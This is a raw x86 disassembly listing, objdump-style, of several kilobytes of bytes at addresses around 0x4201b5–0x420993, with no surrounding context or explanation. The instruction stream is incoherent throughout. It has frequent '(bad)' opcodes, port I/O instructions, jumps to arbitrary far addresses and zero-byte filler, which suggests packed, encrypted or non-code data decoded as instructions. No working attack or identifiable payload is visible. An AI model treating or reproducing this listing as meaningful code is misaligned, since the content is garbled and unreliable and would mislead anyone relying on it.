  4201b5:	jl     0x420180
  4201b7:	cmp    eax,0x12be0f10
  4201bc:	not    esp
  4201be:	pop    eax
  4201bf:	mov    esp,0x10271d23
  4201c4:	sbb    DWORD PTR [ecx+eax*1],0x50
  4201c8:	push   edi
  4201c9:	sbb    ecx,DWORD PTR [edx+0x54]
  4201cc:	push   ss
  4201cd:	mov    esi,?
  4201cf:	jle    0x420195
  4201d1:	jne    0x420232
  4201d3:	xchg   DWORD PTR [edi-0x7f82c540],edi
  4201d9:	test   eax,0xee00005a
  4201de:	mov    ss,WORD PTR [eax+0x5209efe7]
  4201e4:	cld    
  4201e5:	(bad)  
  4201e6:	in     eax,0x4b
  4201e8:	mov    dh,dh
  4201ea:	xchg   BYTE PTR [ebx],al
  4201ec:	add    BYTE PTR [eax],al
  4201ee:	add    BYTE PTR [eax],al
  4201f0:	add    BYTE PTR [eax],al
  4201f2:	jne    0x4201d0
  4201f4:	and    al,0x88
  4201f6:	jne    0x420211
  4201f8:	enter  0x74fc,0xe4
  4201fc:	push   ebx
  4201fd:	inc    ebp
  4201fe:	in     al,dx
  4201ff:	test   DWORD PTR [eax+0x38],ecx
  420202:	(bad)  
  420203:	mov    ds:0x8d750003,al
  420208:	jno    0x420289
  42020a:	push   0x7a740118
  42020f:	aam    0x4d
  420211:	out    0xa1,eax
  420213:	out    0x51,al
  420215:	cld    
  420216:	shl    BYTE PTR [ebp+0x54],cl
  420219:	cld    
  42021a:	pusha  
  42021b:	push   edi
  42021c:	repnz aas 
  42021e:	jne    0x4201f5
  420220:	(bad)  
  420221:	cld    
  420222:	sbb    ch,BYTE PTR [ecx+0x3b]
  420225:	sar    DWORD PTR [ecx+0x5b],0xb7
  420229:	mov    BYTE PTR [ecx+0x46235cdb],bl
  42022f:	or     DWORD PTR [edi+0x39cf4e7],esi
  420235:	add    dh,bh
  420237:	xchg   edx,eax
  420238:	js     0x420294
  42023a:	test   ebp,ebx
  42023c:	sub    dh,BYTE PTR [edx+0x7a]
  42023f:	dec    ebp
  420240:	inc    eax
  420241:	out    0xee,al
  420243:	pop    edx
  420244:	add    BYTE PTR [eax],al
  420246:	test   BYTE PTR [esi],0xf4
  420249:	(bad)  
  42024a:	call   DWORD PTR [eax+ecx*1]
  42024d:	(bad)  
  42024e:	mov    eax,0xe604a602
  420253:	clc    
  420254:	imul   eax,edi,0x0
  420257:	add    BYTE PTR [eax],al
  420259:	add    BYTE PTR [eax],al
  42025b:	cs pop ebx
  42025d:	in     eax,dx
  42025e:	test   eax,0xc75b484a
  420263:	push   ds
  420264:	jp     0x420291
  420266:	hlt    
  420267:	in     eax,dx
  420268:	mov    ebp,0xf2a750ee
  42026d:	popa   
  42026e:	xchg   esp,eax
  42026f:	inc    BYTE PTR [ecx]
  420271:	out    0x3,eax
  420273:	or     eax,0x19512e26
  420278:	jle    0x4202d7
  42027a:	sar    BYTE PTR [ebp+0xa4bcb83],cl
  420280:	jnp    0x42024d
  420282:	push   edi
  420283:	in     eax,dx
  420284:	add    ebp,edx
  420286:	mov    BYTE PTR [edx],0xdd
  420289:	out    0x50,al
  42028b:	addr16 out 0x35,al
  42028e:	xlat   BYTE PTR ds:[ebx]
  42028f:	add    BYTE PTR [edi-0x4d],0xf7
  420293:	loope  0x420262
  420295:	not    BYTE PTR [eax+0x67]
  420298:	test   BYTE PTR [esi],0xb4
  42029b:	int3   
  42029c:	add    ah,bh
  42029e:	jl     0x42027a
  4202a0:	jge    0x4202b6
  4202a2:	fcomp  DWORD PTR [ebx+edi*2-0x7d]
  4202a6:	sti    
  4202a7:	in     eax,dx
  4202a8:	sub    BYTE PTR [esi],cl
  4202aa:	ret    
  4202ab:	mov    al,0x47
  4202ad:	cmc    
  4202ae:	xchg   edx,ebp
  4202b0:	into   
  4202b1:	loop   0x4202fc
  4202b3:	aaa    
  4202b4:	inc    edi
  4202b5:	out    0x5b,eax
  4202b7:	mov    DWORD PTR [edx-0x5a02af23],edx
  4202bd:	(bad)  
  4202be:	test   BYTE PTR [eax],al
  4202c0:	add    BYTE PTR [eax],al
  4202c2:	add    BYTE PTR [eax],al
  4202c4:	aaa    
  4202c5:	dec    edx
  4202c6:	push   cs
  4202c7:	push   ecx
  4202c8:	das    
  4202c9:	dec    esi
  4202ca:	cmp    edx,DWORD PTR [eax-0x3630ec87]
  4202d0:	adc    DWORD PTR [edx],eax
  4202d2:	add    cl,ch
  4202d4:	and    DWORD PTR [edi+0x3f],ebx
  4202d7:	dec    esi
  4202d8:	jbe    0x4202dc
  4202da:	mov    ch,BYTE PTR [esp+eax*8]
  4202dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202de:	pop    ebp
  4202df:	inc    edx
  4202e0:	mov    es,WORD PTR [ecx+0x17]
  4202e3:	jmp    0x6b2d7ceb
  4202e8:	mov    ds:0xa50c80fb,al
  4202ed:	inc    edi
  4202ee:	push   ecx
  4202ef:	push   ss
  4202f0:	mov    al,0xcc
  4202f2:	pop    es
  4202f3:	bound  ebx,QWORD PTR [esi+0x7a]
  4202f6:	test   BYTE PTR [ecx+0x77],bl
  4202f9:	add    al,BYTE PTR [eax]
  4202fb:	jo     0x420330
  4202fd:	push   ebx
  4202fe:	mov    BYTE PTR [edx+0x5142800e],ch
  420304:	scas   al,BYTE PTR es:[edi]
  420305:	pop    ebx
  420306:	cli    
  420307:	dec    esi
  420308:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420309:	cmp    DWORD PTR [edi+0x7245c2bd],0xffffffed
  420310:	jno    0x42031e
  420312:	cld    
  420313:	fnstenv [esi+0x63e96646]
  420319:	(bad)  
  42031a:	repz mov ecx,0x36fd00b8
  420320:	stc    
  420321:	dec    esi
  420322:	(bad)  
  420323:	fwait
  420324:	popa   
  420325:	cmp    DWORD PTR [eax-0x23],0x0
  42032c:	add    BYTE PTR [esi-0x2d],dh
  42032f:	sbb    dh,BYTE PTR [edx-0x4f]
  420332:	(bad)  
  420333:	cld    
  420334:	je     0x4202e8
  420336:	jns    0x420377
  420338:	loope  0x420369
  42033a:	(bad)  
  42033b:	test   DWORD PTR [ebx-0x22bd848a],0xde01d8e1
  420345:	dec    edx
  420346:	or     al,0x2
  420348:	call   0xe7b505c3
  42034d:	idiv   DWORD PTR [ebx-0x554cff05]
  420353:	push   es
  420354:	xor    esp,DWORD PTR ds:0xa9c13740
  42035a:	add    DWORD PTR [ebp-0x786defb3],eax
  420360:	pop    ebp
  420361:	fs stos BYTE PTR es:[edi],al
  420363:	adc    al,0xfe
  420365:	repz mov ch,0x87
  420368:	inc    ebp
  420369:	loopne 0x420300
  42036b:	push   edi
  42036c:	leave  
  42036d:	push   cs
  42036e:	inc    edi
  42036f:	cld    
  420370:	push   esp
  420371:	(bad)  
  420372:	loop   0x4203f3
  420374:	in     al,dx
  420375:	pop    esp
  420376:	xchg   ecx,eax
  420377:	push   edx
  420378:	mov    ebp,DWORD PTR [ecx+ecx*8+0x16ab1042]
  42037f:	sbb    al,al
  420381:	mov    eax,ds:0x5d231284
  420386:	lea    edi,[edi-0x40]
  420389:	add    al,0x92
  42038b:	in     al,0xae
  42038d:	pop    ebx
  42038e:	(bad)  
  42038f:	inc    DWORD PTR [ebx+0x0]
  420395:	add    BYTE PTR [edx+ebp*1+0x3],cl
  420399:	xor    bl,BYTE PTR [edi+eiz*4+0x1dc018f]
  4203a0:	mov    DWORD PTR [ebp-0x74],edi
  4203a3:	leave  
  4203a4:	ret    0x50e8
  4203a7:	push   es
  4203a8:	std    
  4203a9:	(bad)  
  4203aa:	cli    
  4203ab:	cmp    BYTE PTR [ecx-0x20],0xdc
  4203af:	jns    0x4203bd
  4203b1:	daa    
  4203b2:	int3   
  4203b3:	add    DWORD PTR [ebp+0x13930],esi
  4203b9:	je     0x42035b
  4203bb:	pop    edi
  4203bc:	xor    eax,0xd4307c45
  4203c1:	in     ax,0x42
  4203c4:	fdiv   QWORD PTR [edi-0x22]
  4203c7:	pop    edi
  4203c8:	jg     0x420447
  4203ca:	test   al,0x1
  4203cc:	je     0x4203da
  4203ce:	jne    0x420385
  4203d0:	or     al,BYTE PTR [ebx-0x77]
  4203d3:	test   eax,0xe3c6546
  4203d8:	pop    eax
  4203d9:	je     0x42040d
  4203db:	ror    bh,1
  4203dd:	pop    es
  4203de:	clc    
  4203df:	shl    DWORD PTR [esi+edi*8+0x62],cl
  4203e3:	pop    ebx
  4203e4:	mov    al,0xc5
  4203e6:	mov    al,0xa0
  4203e8:	add    dh,al
  4203ea:	mov    eax,0x60fd03a2
  4203ef:	xor    esi,ebx
  4203f1:	aas    
  4203f2:	jne    0x4203d2
  4203f4:	inc    eax
  4203f5:	or     al,0xe0
  4203f7:	adc    eax,0xe74a
  4203fc:	add    BYTE PTR [eax],al
  4203fe:	add    BYTE PTR [ebx+ebx*4+0x0],al
  420402:	add    dh,bh
  420404:	jb     0x42038d
  420406:	fdiv   DWORD PTR [edx-0x21]
  420409:	cmp    edi,0x427f5b1a
  42040f:	cmp    eax,0x1df0798b
  420414:	sub    eax,DWORD PTR [edi-0x1]
  420417:	add    bl,dh
  420419:	inc    eax
  42041a:	ja     0x420455
  42041c:	rcl    BYTE PTR [eax+0x68],1
  42041f:	jmp    0x420423
  420421:	add    DWORD PTR [ecx],esi
  420423:	cmc    
  420424:	lea    eax,[esi-0x1]
  420427:	icebp  
  420428:	xchg   ebp,eax
  420429:	inc    eax
  42042a:	jae    0x4204a5
  42042c:	jno    0x42042e
  42042e:	push   ecx
  42042f:	fnstsw WORD PTR [edi+0x2caff41]
  420435:	data16 fdiv QWORD PTR [ebp+0x5b]
  420439:	jns    0x420403
  42043b:	in     al,dx
  42043c:	xchg   esp,eax
  42043d:	add    al,0xe8
  42043f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420440:	sbb    al,BYTE PTR [ecx]
  420442:	add    ch,bh
  420444:	xchg   ebp,eax
  420445:	dec    ecx
  420446:	call   0x514585b9
  42044b:	lea    eax,[ecx]
  42044d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42044e:	inc    ecx
  42044f:	xchg   edx,eax
  420450:	inc    esp
  420451:	outs   dx,BYTE PTR ds:[esi]
  420452:	mov    DWORD PTR [ebx-0x7203ac88],0x7ccf6718
  42045c:	add    DWORD PTR [ebx],edi
  42045e:	daa    
  42045f:	hlt    
  420460:	(bad)  
  420461:	loop   0x420474
  420463:	add    BYTE PTR [eax],al
  420465:	add    BYTE PTR [eax],al
  420467:	add    dh,ch
  420469:	jecxz  0x4204ab
  42046b:	add    ebp,esi
  42046d:	mov    ebp,0x5b2d79a6
  420472:	lahf   
  420473:	inc    edx
  420474:	push   edx
  420475:	inc    esp
  420476:	bound  eax,QWORD PTR [esi+eax*8-0xd]
  42047a:	popa   
  42047b:	cmp    DWORD PTR [edx-0x77],ebx
  42047e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42047f:	add    al,0x75
  420481:	jle    0x420429
  420483:	fdiv   DWORD PTR [esi+0x3c]
  420486:	and    ecx,DWORD PTR [ecx+0x2b]
  420489:	inc    ebp
  42048a:	mov    ecx,0xe666035b
  42048f:	add    eax,esp
  420491:	pop    edx
  420492:	sub    DWORD PTR [edi+0x12],0xccf6644
  420499:	add    ebx,ebx
  42049b:	(bad)  
  42049c:	out    dx,eax
  42049d:	jnp    0x420511
  42049f:	add    esi,DWORD PTR [ebp+0x2]
  4204a2:	xchg   edi,eax
  4204a3:	dec    esp
  4204a4:	xchg   esi,esp
  4204a6:	fadd   st,st(3)
  4204a8:	jmp    0xe5cf:0xe248b3c3
  4204af:	xchg   ebx,eax
  4204b0:	fistp  DWORD PTR [edx+0x6f]
  4204b3:	add    al,0x75
  4204b5:	add    ah,BYTE PTR [edi-0x31]
  4204b8:	ret    
  4204b9:	add    ah,dh
  4204bb:	xchg   edi,edx
  4204bd:	inc    esp
  4204be:	or     eax,0x8e7bef4d
  4204c3:	add    dh,BYTE PTR [ebp+0x2]
  4204c6:	xchg   edi,eax
  4204c7:	jp     0x420500
  4204c9:	cli    
  4204ca:	push   ebp
  4204cc:	add    BYTE PTR [eax],al
  4204ce:	add    BYTE PTR [eax],al
  4204d0:	add    BYTE PTR [ebx+0x76a911eb],ch
  4204d6:	ja     0x42051a
  4204d8:	mov    cl,0x13
  4204da:	pop    di
  4204dc:	call   0x62920757
  4204e1:	and    eax,0x76a5aa5b
  4204e6:	add    al,BYTE PTR [ebx-0x76e2c157]
  4204ec:	mov    ecx,0xea374d4d
  4204f1:	test   eax,ebx
  4204f3:	call   FWORD PTR [ecx]
  4204f5:	fcmove st,st(0)
  4204f7:	mov    edi,0xff426091
  4204fc:	call   0x823ac5cf
  420501:	cdq    
  420502:	and    eax,0xbdbfe8ff
  420507:	add    esi,DWORD PTR [edx-0x4b]
  42050a:	pop    ebx
  42050b:	pop    eax
  42050c:	test   al,0x76
  42050e:	add    ch,cl
  420510:	sar    DWORD PTR [esp+eax*2],0x8b
  420514:	and    al,0xb1
  420516:	jp     0x4204e0
  420518:	push   ecx
  420519:	fiadd  WORD PTR [eax-0x1]
  42051c:	call   0x6e3ac5af
  420521:	mov    dh,0xcf
  420523:	adc    ch,BYTE PTR [eax-0x17]
  420526:	fdivp  st(6),st
  420528:	call   0xe94077a3
  42052d:	jbe    0x4204f3
  42052f:	push   es
  420530:	cli    
  420531:	ss jp  0x4204fc
  420534:	inc    ecx
  420535:	add    BYTE PTR [eax],al
  420537:	add    BYTE PTR [eax],al
  420539:	add    BYTE PTR [edi+0x41e8ff42],bl
  42053f:	rol    BYTE PTR [edi],1
  420541:	push   ds
  420542:	ret    
  420543:	out    0x11,al
  420545:	test   eax,0x12427876
  42054a:	or     DWORD PTR [ebp-0x3e9affa8],esp
  420550:	add    BYTE PTR [eax],al
  420552:	add    edx,ecx
  420554:	call   0x52c97ddc
  420559:	lea    ecx,[edi]
  42055b:	daa    
  42055c:	std    
  42055d:	call   FWORD PTR [edi+ecx*4-0x48ae39b4]
  420564:	cld    
  420565:	mov    BYTE PTR [ecx-0x52],dl
  420568:	sti    
  420569:	adc    eax,0x3c4c84
  42056e:	outs   dx,DWORD PTR ds:[esi]
  42056f:	mov    BYTE PTR [ebp+0x7f103445],0x64
  420576:	dec    ebp
  420577:	push   es
  420578:	add    BYTE PTR [edi],cl
  42057a:	mov    edx,0x5cfffd07
  42057f:	mov    edi,0x91c7f441
  420584:	pop    esp
  420585:	add    DWORD PTR [esi+eax*1-0x1],ecx
  420589:	jl     0x42056b
  42058b:	shl    DWORD PTR [ecx+0x8],0xa9
  42058f:	inc    ebp
  420590:	add    al,0x50
  420592:	add    al,0xa
  420594:	les    eax,FWORD PTR [eax]
  420596:	or     al,0x83
  420598:	mov    esp,0xfcbb950f
  42059d:	inc    DWORD PTR [eax]
  42059f:	add    BYTE PTR [eax],al
  4205a1:	add    BYTE PTR [eax],al
  4205a3:	sbb    al,0xd4
  4205a5:	inc    ecx
  4205a6:	or     al,0x1d
  4205a8:	push   ebx
  4205a9:	or     BYTE PTR [ebx+0x4748952],cl
  4205af:	pop    esi
  4205b0:	cmp    eax,0x5dcb989
  4205b5:	add    dh,dh
  4205b7:	adc    DWORD PTR [edx],edi
  4205b9:	(bad)  
  4205ba:	jae    0x42056c
  4205bc:	pop    edi
  4205bd:	xor    al,0x8d
  4205bf:	adc    DWORD PTR [esi+0x339b5053],ecx
  4205c5:	dec    eax
  4205c6:	push   ss
  4205c7:	sbb    al,0x6
  4205c9:	xchg   DWORD PTR [ebp+0x75],eax
  4205cc:	adc    eax,DWORD PTR [ebp+0x7cde69c3]
  4205d2:	pop    edi
  4205d3:	je     0x420600
  4205d5:	add    al,ch
  4205d7:	data16 in al,dx
  4205d9:	add    eax,DWORD PTR [eax]
  4205db:	mov    ds:0x28fc50be,al
  4205e0:	xor    eax,DWORD PTR [ebp+0x48e3896a]
  4205e6:	adc    ch,BYTE PTR [ecx+0x3d]
  4205e9:	sar    bh,0xef
  4205ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205ed:	cmp    dh,0x7a
  4205f0:	sub    ebx,edx
  4205f2:	inc    DWORD PTR [ecx]
  4205f4:	out    dx,al
  4205f5:	mov    ecx,DWORD PTR [edi-0x5a]
  4205f8:	imul   ebx,DWORD PTR [eax-0x7e],0x27
  4205fc:	jns    0x420647
  4205fe:	xor    BYTE PTR ds:0x7469eff1,0xb6
  420605:	mov    edi,0xb7
  42060a:	add    BYTE PTR [eax],al
  42060c:	(bad)  
  42060d:	jo     0x420667
  42060f:	jo     0x420645
  420611:	sub    eax,DWORD PTR [eax]
  420613:	test   BYTE PTR ds:0xb8c60017,dh
  420619:	mov    BYTE PTR [ebx],al
  42061b:	std    
  42061c:	mov    al,ds:0x7d1249bb
  420621:	pop    ebp
  420622:	sar    bh,0xf
  420625:	and    dh,bl
  420627:	(bad)  
  420628:	(bad)  
  420629:	out    dx,eax
  42062a:	jge    0x4205f9
  42062c:	sbb    eax,0x2ff4376
  420631:	scas   eax,DWORD PTR es:[edi]
  420632:	inc    eax
  420633:	jae    0x420683
  420635:	les    ebx,FWORD PTR [edi]
  420637:	mov    DWORD PTR [eax+0x33],eax
  42063a:	jge    0x42062b
  42063c:	pop    esi
  42063d:	stc    
  42063e:	or     BYTE PTR [ecx],al
  420640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420641:	inc    ebp
  420642:	add    BYTE PTR [edi-0x33],cl
  420645:	retf   
  420646:	inc    ebx
  420647:	call   edx
  420649:	add    DWORD PTR [ebx+0x43],ebp
  42064c:	inc    esi
  42064d:	push   es
  42064e:	and    eax,0x6202c1c0
  420653:	retf   0xfb76
  420656:	mov    edi,?
  420658:	and    eax,0x76c97009
  42065d:	dec    eax
  42065e:	mov    ds:0xab8ba34a,eax
  420663:	dec    ebx
  420664:	out    dx,eax
  420665:	mov    WORD PTR [esi-0x30fd8afc],es
  42066b:	lahf   
  42066c:	mov    ah,0x1
  42066e:	out    0x48,eax
  420670:	add    BYTE PTR [eax],al
  420672:	add    BYTE PTR [eax],al
  420674:	add    BYTE PTR [edi],ch
  420676:	cmp    ch,BYTE PTR [ecx-0x29]
  420679:	xchg   cl,bh
  42067b:	int    0xbf
  42067d:	push   0xffffff8c
  42067f:	sub    ecx,DWORD PTR [ebp+esi*8-0x3b]
  420683:	mov    dl,0xc
  420685:	pushf  
  420686:	or     DWORD PTR [edx+0x3],0x75
  42068a:	add    bl,dh
  42068c:	ja     0x420702
  42068e:	aas    
  42068f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420690:	dec    ecx
  420691:	dec    ecx
  420692:	mov    dh,0x96
  420694:	dec    ecx
  420695:	addr16 push ds
  420697:	stc    
  420698:	ret    
  420699:	cmp    al,al
  42069b:	or     ecx,DWORD PTR [ecx+0x32]
  42069e:	mov    ah,0xee
  4206a0:	jl     0x420659
  4206a2:	or     cl,BYTE PTR [edi-0x18fd1ed5]
  4206a8:	jge    0x420661
  4206aa:	aas    
  4206ab:	or     eax,0xee453baa
  4206b0:	add    ebx,DWORD PTR [edi-0xd6ba1fe]
  4206b6:	add    edi,esp
  4206b8:	add    edi,eax
  4206ba:	adc    eax,0x2b2f4eb
  4206bf:	ds sub al,0x8d
  4206c2:	inc    edx
  4206c3:	xor    eax,0xff7ab52c
  4206c8:	ficom  DWORD PTR [ecx+0x222aa1fc]
  4206ce:	mov    ebp,ebx
  4206d0:	push   0x55
  4206d2:	aaa    
  4206d3:	jle    0x4206e2
  4206d5:	pop    ebp
  4206d6:	or     DWORD PTR [eax],eax
  4206d8:	jmp    0x4206dd
  4206dd:	add    BYTE PTR [ecx],al
  4206df:	(bad)  
  4206e0:	push   esp
  4206e1:	sbb    DWORD PTR [esi],0x29e8fff9
  4206e7:	cmp    ah,bh
  4206e9:	aam    0xc2
  4206eb:	adc    DWORD PTR [eax-0x17],eax
  4206ee:	and    esi,DWORD PTR [ebx-0x8d166dd]
  4206f4:	pusha  
  4206f5:	out    0x3d,al
  4206f7:	mov    dh,BYTE PTR [edx]
  4206f9:	or     DWORD PTR [ebx-0x59c0001],ecx
  4206ff:	loop   0x4206d0
  420701:	jmp    0xc692097c
  420706:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420707:	and    BYTE PTR [ebx-0x3c102fb],0xe9
  42070e:	jbe    0x4206bc
  420710:	inc    DWORD PTR [edx+0x76]
  420713:	icebp  
  420714:	mov    edi,0xb7e3d274
  420719:	jmp    0x55c90994
  42071e:	pop    edx
  42071f:	jb     0x420720
  420721:	call   0x6bc319c
  420726:	mov    esp,0x40e9693e
  42072b:	add    DWORD PTR [ecx],esi
  42072d:	test   eax,0xa1239ba3
  420732:	jbe    0x420736
  420734:	add    BYTE PTR [ecx+0x29],dl
  420737:	mov    esi,0xc38b5efc
  42073c:	and    edi,DWORD PTR [ecx-0x7adc7c81]
  420742:	add    BYTE PTR [eax],al
  420744:	add    BYTE PTR [eax],al
  420746:	add    BYTE PTR [esi+0x2],dh
  420749:	add    BYTE PTR [eax],al
  42074b:	gs jg  0x42076e
  42074e:	adc    al,0x51
  420750:	jg     0x420772
  420752:	sbb    ah,bh
  420754:	mov    ebx,0x2f824b8
  420759:	add    BYTE PTR [eax],al
  42075b:	inc    ebp
  42075c:	inc    edi
  42075d:	and    BYTE PTR [ebx+eiz*2],dl
  420760:	icebp  
  420761:	xchg   DWORD PTR ds:0x3c30fc,ebx
  420767:	idiv   BYTE PTR [edx]
  420769:	das    
  42076a:	mul    BYTE PTR [ecx]
  42076c:	jg     0x42078e
  42076e:	xor    al,0xa
  420770:	jae    0x42076d
  420772:	ror    DWORD PTR [edi],cl
  420774:	dec    DWORD PTR [eax]
  420776:	push   0xffffffac
  420778:	mov    bh,0x40
  42077a:	and    al,0x50
  42077c:	jo     0x4207ca
  42077e:	(bad)  
  42077f:	mov    edi,0x3a0cc082
  420784:	mov    ecx,0xbf682440
  420789:	jo     0x4207af
  42078b:	mov    al,ds:0x7c2470bf
  420790:	fimul  WORD PTR [edx]
  420792:	mov    ah,0x4c
  420794:	add    al,BYTE PTR [edi+0x2092b1c7]
  42079a:	call   0xe84209fb
  42079f:	rol    BYTE PTR [edi-0x5],cl
  4207a2:	call   ecx
  4207a4:	and    BYTE PTR [eax],0x98
  4207a7:	sbb    eax,0x330002
  4207ac:	add    BYTE PTR [eax],al
  4207ae:	add    BYTE PTR [eax],al
  4207b0:	stos   BYTE PTR es:[edi],al
  4207b1:	jbe    0x420738
  4207b3:	mov    ah,0x38
  4207b5:	mov    bh,ch
  4207b7:	dec    DWORD PTR [edi+edi*4]
  4207ba:	mov    al,0x24
  4207bc:	pusha  
  4207bd:	pop    es
  4207be:	add    BYTE PTR [eax],al
  4207c0:	pop    ebx
  4207c1:	and    BYTE PTR [eax],0xb4
  4207c4:	or     eax,0x759c0002
  4207c9:	push   ebx
  4207ca:	sar    bh,0xf3
  4207cd:	and    BYTE PTR ss:[edx],dl
  4207d0:	xor    eax,0x76e9d82b
  4207d5:	sub    eax,DWORD PTR [eax]
  4207d7:	mov    esi,ecx
  4207d9:	cmove  edi,esi
  4207dc:	shr    BYTE PTR [ebx],cl
  4207de:	stos   BYTE PTR es:[edi],al
  4207df:	dec    edi
  4207e0:	retf   0x76f8
  4207e3:	sbb    DWORD PTR [ecx+0x750003cf],0xffffffa2
  4207ea:	jl     0x42086b
  4207ec:	je     0x420819
  4207ee:	add    BYTE PTR [ebx-0x791bb0cf],cl
  4207f4:	cli    
  4207f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207f6:	add    al,BYTE PTR [eax]
  4207f8:	jne    0x4207a0
  4207fa:	jg     0x42081f
  4207fc:	mov    DWORD PTR [ebx],ebp
  4207fe:	add    BYTE PTR [eax],al
  420800:	imul   BYTE PTR [edi-0xc]
  420803:	xchg   dl,bh
  420805:	mov    bl,0x3
  420807:	add    BYTE PTR [ebp-0x5a],dh
  42080a:	jl     0x42082f
  42080c:	or     eax,0xc200002a
  420811:	mov    dl,0x7d
  420813:	mov    eax,DWORD PTR [eax]
  420815:	add    BYTE PTR [eax],al
  420817:	add    BYTE PTR [eax],al
  420819:	je     0x420846
  42081b:	add    al,ch
  42081d:	dec    ebp
  42081e:	jnp    0x420865
  420820:	cld    
  420821:	fbld   TBYTE PTR [ebx]
  420823:	pop    eax
  420824:	sbb    ch,bh
  420826:	sub    al,BYTE PTR [eax]
  420828:	xor    DWORD PTR ds:0x75c4f717,0x67
  42082f:	iret   
  420830:	aas    
  420831:	jne    0x4207d5
  420833:	enter  0xfe03,0xba
  420837:	pop    ecx
  420838:	add    DWORD PTR [esi-0x4b],esp
  42083b:	ja     0x420880
  42083d:	push   ecx
  42083e:	sbb    ebx,DWORD PTR [eax+edi*4+0x19]
  420842:	lods   eax,DWORD PTR ds:[esi]
  420843:	inc    ebp
  420844:	xor    DWORD PTR ds:0xedfadc02,0x44
  42084b:	dec    esi
  42084c:	int3   
  42084d:	clc    
  42084e:	cmp    al,0x55
  420850:	jg     0x420884
  420852:	mov    bh,0x1c
  420854:	fisttp DWORD PTR [edx+0x28]
  420857:	out    0x3,al
  420859:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42085a:	pop    ecx
  42085b:	cdq    
  42085c:	js     0x42084f
  42085e:	loope  0x420847
  420860:	add    esi,DWORD PTR [ebp-0x2e]
  420863:	fisttp QWORD PTR [ebp+0x3e7f9f1]
  420869:	jne    0x42083d
  42086b:	sbb    eax,0xa711bef0
  420870:	add    esi,esp
  420872:	cmp    DWORD PTR ds:0xe8ff84cf,ecx
  420878:	add    al,0x75
  42087a:	add    dh,BYTE PTR [ebx-0x6]
  42087d:	add    BYTE PTR [eax],al
  42087f:	add    BYTE PTR [eax],al
  420881:	add    BYTE PTR [ecx+0x74],ch
  420884:	or     edx,DWORD PTR gs:[edx-0x35f519c4]
  42088b:	scas   eax,DWORD PTR es:[edi]
  42088c:	imul   DWORD PTR [edx+ebx*4+0x7945d6bd]
  420893:	mov    gs,WORD PTR [edx]
  420895:	and    ch,al
  420897:	sub    dl,bh
  420899:	jecxz  0x420904
  42089b:	cmp    al,0xd1
  42089d:	mov    ebp,ebp
  42089f:	mov    fs,WORD PTR [ebp+0x24]
  4208a2:	pop    edx
  4208a3:	cmp    al,0xe6
  4208a5:	or     BYTE PTR [eax],al
  4208a7:	xchg   ebx,eax
  4208a8:	out    0x3,eax
  4208aa:	jne    0x4208b7
  4208ac:	imul   edx,DWORD PTR [ecx],0x42
  4208af:	cmp    al,0xe6
  4208b1:	js     0x4208a4
  4208b3:	fsubrp st(7),st
  4208b5:	add    esi,DWORD PTR [ebp-0x9]
  4208b8:	sahf   
  4208b9:	iret   
  4208ba:	jg     0x4208b3
  4208bc:	test   eax,0xa5877bd0
  4208c1:	pop    esp
  4208c2:	fld    TBYTE PTR [edi]
  4208c4:	push   DWORD PTR [ebp-0x48]
  4208c7:	sub    cl,BYTE PTR [esi+0xbdfdd61]
  4208cd:	div    al
  4208cf:	mov    edi,0x7f7ded23
  4208d4:	test   cl,ah
  4208d6:	ja     0x4208da
  4208d8:	add    BYTE PTR [edx],dl
  4208da:	xor    al,0xaf
  4208dc:	add    al,BYTE PTR [eax]
  4208de:	and    DWORD PTR [esp+esi*2],eax
  4208e1:	fnstenv [eax]
  4208e3:	mov    edi,0xe523
  4208e8:	add    BYTE PTR [eax],al
  4208ea:	add    dh,dh
  4208ec:	mov    bh,0x23
  4208ee:	(bad)  
  4208f0:	mov    cl,0xdf
  4208f2:	adc    BYTE PTR [ecx],ah
  4208f4:	cmp    edi,esp
  4208f6:	jmp    0xcd857ebc
  4208fb:	stos   BYTE PTR es:[edi],al
  4208fc:	mov    dh,BYTE PTR [ebx-0x3c3569a]
  420902:	jmp    0x654e3a74
  420907:	gs cmp edi,esp
  42090a:	jmp    0x7565c81a
  42090f:	(bad)  
  420910:	ds jne 0x420904
  420913:	cmp    DWORD PTR [ebp+0x3b8bde03],esi
  420919:	adc    ch,BYTE PTR [ecx]
  42091b:	jns    0x42099c
  42091d:	mov    edi,0xff6bebde
  420922:	call   0x5853d9d
  420927:	inc    ebp
  420928:	add    esi,DWORD PTR [edx+edi*8+0x7f]
  42092c:	sahf   
  42092d:	and    esp,DWORD PTR [ebp+0x76]
  420930:	add    al,BYTE PTR [eax]
  420932:	not    bl
  420934:	jnp    0x4208b9
  420936:	test   eax,0xe9948041
  42093b:	jbe    0x42093f
  42093d:	jmp    0x84cbf01f
  420942:	add    BYTE PTR [eax+eax*1-0x5fc0000],cl
  420949:	stos   BYTE PTR es:[edi],al
  42094a:	dec    BYTE PTR [ebx+0x2480b4]
  420950:	add    BYTE PTR [eax],al
  420952:	add    BYTE PTR [eax],al
  420954:	and    al,0x0
  420956:	add    BYTE PTR [eax],al
  420958:	mov    esp,0x5e8cab9
  42095d:	jl     0x42095b
  42095f:	inc    DWORD PTR [edi+0x42e171c1]
  420965:	jnp    0x420987
  420967:	je     0x420936
  420969:	dec    edx
  42096a:	push   eax
  42096b:	cmp    eax,edi
  42096d:	sbb    bh,BYTE PTR [eax+0xf]
  420970:	xor    DWORD PTR [edi+0x5b01c080],edi
  420976:	xchg   DWORD PTR [esi],eax
  420978:	in     al,0xae
  42097a:	add    DWORD PTR [eax],eax
  42097c:	int3   
  42097d:	mov    bl,0x88
  42097f:	and    al,0x38
  420981:	cmp    al,0xfc
  420983:	(bad)  
  420984:	in     eax,dx
  420985:	mov    bl,0x88
  420987:	and    al,0xac
  420989:	(bad)  
  42098a:	(bad)  
  42098b:	(bad)  
  42098c:	std    
  42098d:	mov    ecx,0x36ecffca
  420992:	aaa    
  420993:	ret    
